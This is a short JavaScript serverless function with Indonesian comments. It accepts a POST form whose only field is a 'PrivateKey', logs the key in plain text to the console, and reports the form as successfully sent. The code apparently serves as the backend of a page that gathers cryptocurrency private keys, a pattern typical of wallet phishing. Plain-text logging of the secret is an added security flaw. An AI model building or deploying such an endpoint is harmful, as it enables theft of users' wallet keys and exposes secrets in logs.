exports.handler = async (event, context) => {
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: 'Metode ini hanya menerima POST',
    };
  }

  // Ambil data dari body
  const { PrivateKey } = JSON.parse(event.body);

  if (!PrivateKey) {
    return {
      statusCode: 400,
      body: 'Private Key tidak ditemukan!',
    };
  }

  // Simpan atau proses PrivateKey (contoh sederhana log ke konsol)
  console.log(`Private Key diterima: ${PrivateKey}`);

  return {
    statusCode: 200,
    body: 'Form berhasil dikirim!',
  };
};
